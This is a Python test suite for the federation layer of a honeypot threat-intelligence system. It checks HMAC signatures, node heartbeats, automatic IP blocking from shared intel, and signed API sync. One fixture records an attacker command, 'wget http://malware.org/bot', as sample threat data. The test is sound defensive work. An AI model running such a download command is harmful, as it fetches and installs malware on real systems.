"""
Comprehensive Automated Verification Suite for Phase 4: Node Federation (v2.0)
=============================================================================
Tests:
1. HMAC Cryptographic Signatures & Tamper Resistance
2. Node Clustering, Registration, and Heartbeats
3. Collaborative Active Defense & Threat Intel Synchronization
4. Machine-to-Machine HMAC Auth & Operator Console Endpoints
"""

import sys
import os
import json
import time

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)


def test_1_hmac_signatures():
    print("\n[+] TEST 1: Cryptographic HMAC Signatures & Tamper Resistance")
    from federation.node_manager import generate_node_signature, verify_node_signature
    from config import settings

    payload = b'{"origin_node": "sensor-01", "ip": "1.2.3.4"}'
    valid_sig = generate_node_signature(payload, settings.FEDERATION_SECRET)
    assert valid_sig, "Signature must not be empty"
    assert verify_node_signature(payload, valid_sig, settings.FEDERATION_SECRET) is True, "Valid signature must verify"

    # Tampered payload check
    tampered_payload = b'{"origin_node": "sensor-01", "ip": "1.2.3.5"}'
    assert verify_node_signature(tampered_payload, valid_sig, settings.FEDERATION_SECRET) is False, "Tampered payload must fail"

    # Wrong secret check
    assert verify_node_signature(payload, valid_sig, "wrong_secret_key") is False, "Wrong secret key must fail"
    print("  -> PASS: HMAC-SHA256 signature generation and tamper verification confirmed.")


def test_2_node_clustering_and_heartbeat():
    print("\n[+] TEST 2: Sensor Node Clustering, Registration & Heartbeats")
    from federation.node_manager import (
        register_or_update_node,
        record_heartbeat,
        get_federated_nodes,
        get_local_node_info
    )

    local = get_local_node_info()
    assert local["node_id"] is not None
    assert local["status"] == "online"

    # Register remote edge sensor
    test_node_id = f"edge-node-test-{int(time.time())}"
    reg_res = register_or_update_node(
        node_id=test_node_id,
        node_name="Test Sensor (Tokyo)",
        region="AP-Northeast-1",
        endpoint_url="https://tokyo.sensor.test",
        is_hub=False,
        attacks_reported=50
    )
    assert reg_res["node_id"] == test_node_id
    assert reg_res["region"] == "AP-Northeast-1"

    # Heartbeat
    hb_ok = record_heartbeat(test_node_id, attacks_count=55)
    assert hb_ok is True, "Heartbeat must succeed for registered node"

    nodes = get_federated_nodes()
    node_ids = [n["node_id"] for n in nodes]
    assert test_node_id in node_ids, "Registered node must appear in node roster"
    print(f"  -> PASS: Registered sensor node {test_node_id} and verified heartbeat.")


def test_3_collaborative_defense_sync():
    print("\n[+] TEST 3: Collaborative Active Defense & Threat Sync")
    from federation.sync import export_local_threat_intel, ingest_federated_threat_intel
    from defense.firewall import is_ip_blocked

    # 1. Export local intel
    exported = export_local_threat_intel(limit=10)
    assert "origin_node" in exported
    assert "blocked_ips" in exported
    assert "critical_events" in exported

    # 2. Simulate peer sensor sending an IoC to block
    target_malicious_ip = "198.51.100.99"
    peer_payload = {
        "origin_node": "peer-sensor-frankfurt",
        "blocked_ips": [{
            "ip": target_malicious_ip,
            "reason": "SSH Brute Force credential cracking",
            "risk_score": 95,
            "country": "Germany"
        }],
        "critical_events": [{
            "source_ip": target_malicious_ip,
            "service": "SSH",
            "username": "root",
            "command": "wget http://malware.org/bot",
            "attack_type": "malware_download",
            "risk_score": 95,
            "country": "Germany"
        }]
    }

    ingest_res = ingest_federated_threat_intel(peer_payload, origin_node="peer-sensor-frankfurt")
    assert ingest_res["status"] == "success"

    # 3. Verify Active Defense immediately blocked the federated IP
    assert is_ip_blocked(target_malicious_ip) is True, "Federated malicious IP MUST be blocked in local active defense!"
    print(f"  -> PASS: Malicious IP {target_malicious_ip} automatically propagated and blocked by federation.")


def test_4_federation_api_endpoints():
    print("\n[+] TEST 4: Machine HMAC Authentication & Operator Endpoints")
    from api.app import create_app
    from federation.node_manager import generate_node_signature
    from config import settings

    app = create_app()
    client = app.test_client()

    # 1. Unauthenticated request without HMAC signature -> 401
    r_unauth = client.post("/api/federation/sync", json={"test": "data"})
    assert r_unauth.status_code == 401, f"Expected 401 for unauth sync, got {r_unauth.status_code}"

    # 2. Machine sync with valid HMAC signature -> 200 Success
    sync_body = json.dumps({
        "origin_node": "node-peer-01",
        "blocked_ips": [],
        "critical_events": []
    })
    sig = generate_node_signature(sync_body.encode('utf-8'), settings.FEDERATION_SECRET)

    r_machine = client.post(
        "/api/federation/sync",
        data=sync_body,
        headers={
            "Content-Type": "application/json",
            "X-HoneyTrack-Node-Id": "node-peer-01",
            "X-HoneyTrack-Signature": sig
        }
    )
    assert r_machine.status_code == 200, f"Expected 200 for signed machine sync, got {r_machine.status_code}"
    resp_data = r_machine.get_json()
    assert resp_data["status"] == "success"
    assert "local_intel" in resp_data
    print("  -> PASS: Cryptographically signed machine-to-machine sync authenticated and acknowledged.")

    # 3. Operator authenticated console access to nodes list
    with client.session_transaction() as sess:
        sess["user_id"] = 1
        sess["user_email"] = "admin@honeytrack.local"

    r_nodes = client.get("/api/federation/nodes")
    assert r_nodes.status_code == 200
    nodes_data = r_nodes.get_json()
    assert nodes_data["status"] == "success"
    assert "nodes" in nodes_data
    assert len(nodes_data["nodes"]) > 0
    print(f"  -> PASS: Operator console retrieved {len(nodes_data['nodes'])} federated sensor nodes.")


if __name__ == "__main__":
    test_1_hmac_signatures()
    test_2_node_clustering_and_heartbeat()
    test_3_collaborative_defense_sync()
    test_4_federation_api_endpoints()
    print("\n==========================================")
    print("PHASE 4 (NODE FEDERATION) TESTS PASSED (100% OK)")
    print("==========================================\n")
